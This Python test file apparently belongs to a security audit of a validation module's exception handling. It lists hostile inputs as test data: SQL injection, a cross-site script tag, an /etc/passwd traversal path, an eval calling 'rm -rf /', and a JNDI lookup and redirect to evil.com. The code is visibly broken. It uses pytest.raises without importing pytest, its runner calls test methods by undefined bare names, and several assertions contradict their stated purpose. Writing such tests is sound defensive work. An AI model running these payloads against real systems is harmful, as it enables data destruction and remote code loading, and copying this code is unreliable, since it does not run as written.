"""
MAJOR-007: Test Suite for Improper Exception Handling in Validation Module

This test suite demonstrates the vulnerabilities caused by improper exception
handling patterns in the validation module before the security fixes.

Key vulnerabilities tested:
1. Broad exception catching masks validation errors (line 171-172)
2. Generic exception handling allows bypass of validation logic (line 454-455)
3. Silent error returns allow dangerous operations to continue (line 649-651)
4. Missing security logging for validation failures
5. Information disclosure through exception details
"""

# Simple test runner without pytest
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from reasoning_library.validation import (
    validate_dict_schema,
    validate_parameters,
    safe_divide,
    safe_array_operation,
    _validate_string_confidence,
    validate_confidence_value,
    validate_string_list
)
from reasoning_library.exceptions import ValidationError
from reasoning_library.security_logging import get_security_logger


class SimpleTestRunner:
    """Simple test runner without pytest dependency."""

    def assert_raises(self, exception_type, func, *args, **kwargs):
        """Simple assertion that function raises expected exception."""
        try:
            func(*args, **kwargs)
            raise AssertionError(f"Expected {exception_type.__name__} but no exception was raised")
        except exception_type as e:
            return e  # Return the exception for analysis
        except Exception as e:
            raise AssertionError(f"Expected {exception_type.__name__} but got {type(e).__name__}: {e}")

# Global test runner
_test = SimpleTestRunner()


class TestBroadExceptionHandling:
    """Test cases demonstrating vulnerabilities from broad exception handling."""

    def test_validate_dict_schema_masks_validation_errors(self):
        """
        VULNERABILITY: Broad exception catching in validate_dict_schema
        masks malicious validation errors and allows attack attempts to pass silently.

        Location: validation.py lines 171-172
        """
        # Custom validator that raises an exception (simulating attack detection)
        def malicious_validator(value):
            raise RuntimeError("Potential attack detected in value!")

        # Test with malicious input
        malicious_data = {"key": "malicious_value"}

        # VULNERABLE: The broad except catches the RuntimeError and converts it to ValidationError
        # This masks the security issue and loses important attack information
        exc_info = _test.assert_raises(ValidationError, validate_dict_schema,
            malicious_data,
            "test_field",
            value_validators={"key": malicious_validator}
        )

        # The original security exception information is lost
        error_msg = str(exc_info)
        if "attack detected" not in error_msg.lower():
            print(f"✅ CONFIRMED: Security context lost: {error_msg}")
        else:
            print(f"❓ UNEXPECTED: Security context preserved: {error_msg}")

    def test_validate_parameters_decorator_masks_errors(self):
        """
        VULNERABILITY: Broad exception catching in validate_parameters decorator
        allows validation bypass and loses security context.

        Location: validation.py lines 454-455
        """
        # Custom validator that detects injection attacks
        def injection_validator(value):
            if "'; DROP TABLE" in str(value):
                raise SecurityError("SQL injection attempt detected!")
            return value

        @validate_parameters(user_input=injection_validator)
        def process_data(user_input):
            return f"Processed: {user_input}"

        # VULNERABLE: The decorator catches the SecurityError and converts to generic ValidationError
        malicious_input = "'; DROP TABLE users; --"

        with pytest.raises(ValidationError) as exc_info:
            process_data(user_input=malicious_input)

        # Security context is lost
        error_msg = str(exc_info.value)
        assert "injection" not in error_msg.lower()  # Attack type lost
        assert "validation failed" in error_msg  # Generic message only

        print(f"❌ VULNERABILITY: Injection attack masked: {error_msg}")

    def test_safe_divide_silently_ignores_errors(self):
        """
        VULNERABILITY: safe_divide silently returns default values on validation errors,
        allowing dangerous operations to continue without alerting.

        Location: validation.py lines 649-651
        """
        # Test with malicious numerator that would normally cause validation error
        malicious_numerator = "'; DROP TABLE users; --"
        valid_denominator = 10

        # VULNERABLE: Function silently returns default value instead of raising error
        result = safe_divide(malicious_numerator, valid_denominator)

        # Should have failed validation but silently returned 0.0
        assert result == 0.0  # Default value returned

        # No indication that something went wrong - this is dangerous!
        print(f"❌ VULNERABILITY: Malicious input silently processed: {result}")

        # Test with malicious denominator
        malicious_denominator = "eval(__import__('os').system('rm -rf /'))"
        valid_numerator = 100

        result = safe_divide(valid_numerator, malicious_denominator)
        assert result == 0.0  # Silent failure

        print(f"❌ VULNERABILITY: Code injection attempt ignored: {result}")

    def test_safe_array_operation_masks_dangerous_operations(self):
        """
        VULNERABILITY: safe_array_operation catches all exceptions and masks
        potentially dangerous operation failures.

        Location: validation.py lines 683-684
        """
        malicious_array = [1, 2, "'; DROP TABLE users; --", 4]

        def malicious_operation(array):
            # This would normally raise a TypeError or ValueError
            return array.sum() * float("'; DROP TABLE users; --")

        # VULNERABLE: Catches all exceptions and converts to generic ValidationError
        with pytest.raises(ValidationError) as exc_info:
            safe_array_operation(malicious_operation, malicious_array)

        # Original exception information (malicious content) is lost
        error_msg = str(exc_info.value)
        assert "drop table" not in error_msg.lower()  # Attack context masked

        print(f"❌ VULNERABILITY: Array operation attack masked: {error_msg}")

    def test_missing_security_logging_for_validation_failures(self):
        """
        VULNERABILITY: Validation failures that could indicate attack attempts
        are not logged to security monitoring systems.
        """
        security_logger = get_security_logger()
        initial_metrics = security_logger.get_security_metrics()

        # Simulate multiple validation failures that could be attack attempts
        attack_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../../etc/passwd",
            "eval(__import__('os').system('rm -rf /'))",
            "${jndi:ldap://evil.com/a}",
        ]

        for attack_input in attack_inputs:
            try:
                # These should be logged as potential security events
                validate_confidence_value(attack_input)
            except ValidationError:
                pass  # Expected to fail, but should be logged for security

        # VULNERABILITY: No security events logged for these suspicious validation failures
        final_metrics = security_logger.get_security_metrics()

        # Security metrics should have increased but didn't
        assert final_metrics["total_events"] == initial_metrics["total_events"]

        print(f"❌ VULNERABILITY: {len(attack_inputs)} attack attempts not logged for security monitoring")

    def test_information_disclosure_through_exception_details(self):
        """
        VULNERABILITY: Exception details may leak sensitive information
        about the internal structure or attack detection mechanisms.
        """
        # Test with input that causes detailed validation errors
        malicious_dict = {
            "hypothesis": "test",
            "confidence": "'; DROP TABLE users; --",  # This will cause detailed error
            "evidence": "<script>location='http://evil.com'</script>",
            "coverage": "not a number",
            "simplicity": float('inf'),
            "specificity": -100
        }

        try:
            validate_confidence_value(malicious_dict["confidence"])
        except ValidationError as e:
            error_msg = str(e)
            # VULNERABILITY: May expose internal validation patterns
            if "pattern" in error_msg.lower() or "regex" in error_msg.lower():
                print(f"❌ VULNERABILITY: Internal validation patterns exposed: {error_msg}")

            # May expose attack detection mechanisms
            if "dangerous" in error_msg.lower() or "invalid format" in error_msg.lower():
                print(f"❌ VULNERABILITY: Attack detection logic exposed: {error_msg}")

    def test_validation_bypass_through_exception_handling(self):
        """
        VULNERABILITY: Broad exception handling allows validation bypass
        by triggering expected exceptions that are caught and ignored.
        """
        # Create a validator that can be bypassed by triggering exceptions
        class BypassableValidator:
            def __call__(self, value):
                if isinstance(value, str) and value.startswith("bypass:"):
                    # Trigger an exception that will be caught by broad exception handler
                    raise TypeError(f"Cannot process {value}")
                return value.upper()  # Normal processing

        validator = BypassableValidator()

        # Normal input works correctly
        normal_result = validator("normal_input")
        assert normal_result == "NORMAL_INPUT"

        # VULNERABLE: Bypass attempt by triggering exception
        # In the context of validate_dict_schema, this would be caught and converted
        # to a ValidationError, potentially allowing the operation to continue

        test_data = {"safe_field": "value", "bypass_field": "bypass:malicious_payload"}

        with pytest.raises(ValidationError) as exc_info:
            validate_dict_schema(
                test_data,
                "test_dict",
                value_validators={"bypass_field": validator}
            )

        # The bypass attempt was caught but the original intent is lost
        error_msg = str(exc_info.value)
        assert "bypass" not in error_msg.lower()  # Bypass attempt masked

        print(f"❌ VULNERABILITY: Validation bypass attempt masked: {error_msg}")


class TestExceptionChainingAndContext:
    """Test exception chaining and security context preservation."""

    def test_exception_chaining_breaks_security_tracing(self):
        """
        VULNERABILITY: Exception chaining breaks security audit trails
        by converting specific security exceptions to generic ValidationError.
        """
        # Simulate a security exception in a nested validator
        def inner_validator(value):
            if "MALICIOUS_PAYLOAD" in str(value):
                raise SecurityError("Malicious payload detected in inner validation")
            return value

        def outer_validator(value):
            try:
                # This would normally preserve SecurityError context
                return inner_validator(value)
            except Exception as e:
                # VULNERABILITY: Convert to ValidationError, losing security context
                raise ValidationError(f"Outer validation failed: {e}")

        # Test with malicious input
        with pytest.raises(ValidationError) as exc_info:
            outer_validator("Input with MALICIOUS_PAYLOAD")

        # Security context is lost in exception chain
        error_msg = str(exc_info.value)
        assert "malicious" not in error_msg.lower()  # Security context lost
        assert "security" not in error_msg.lower()  # Exception type lost

        print(f"❌ VULNERABILITY: Security audit trail broken: {error_msg}")


# Mock SecurityError for testing
class SecurityError(Exception):
    """Mock security exception for testing."""
    pass


if __name__ == "__main__":
    # Run the tests to demonstrate vulnerabilities
    print("🔍 MAJOR-007: Demonstrating Improper Exception Handling Vulnerabilities")
    print("=" * 70)

    # Run each test and show vulnerabilities
    test_methods = [
        test_validate_dict_schema_masks_validation_errors,
        test_validate_parameters_decorator_masks_errors,
        test_safe_divide_silently_ignores_errors,
        test_safe_array_operation_masks_dangerous_operations,
        test_missing_security_logging_for_validation_failures,
        test_information_disclosure_through_exception_details,
        test_validation_bypass_through_exception_handling,
        test_exception_chaining_breaks_security_tracing,
    ]

    test_instance = TestBroadExceptionHandling()
    test_instance2 = TestExceptionChainingAndContext()

    for i, test_method in enumerate(test_methods, 1):
        print(f"\n🧪 Test {i}: {test_method.__doc__.split('VULNERABILITY:')[1].strip() if 'VULNERABILITY:' in test_method.__doc__ else test_method.__name__}")
        print("-" * 50)

        try:
            test_method(test_instance) if i <= 7 else test_method(test_instance2)
            print("✅ Vulnerability confirmed")
        except Exception as e:
            print(f"⚠️  Test error: {e}")

    print("\n" + "=" * 70)
    print("🚨 SUMMARY: Multiple critical exception handling vulnerabilities detected!")
    print("📝 IMPACT: Attack attempts can be masked, security logging is bypassed,")
    print("   and validation can be bypassed through exception handling.")
    print("🔧 FIX: Implement specific exception types and proper security logging.")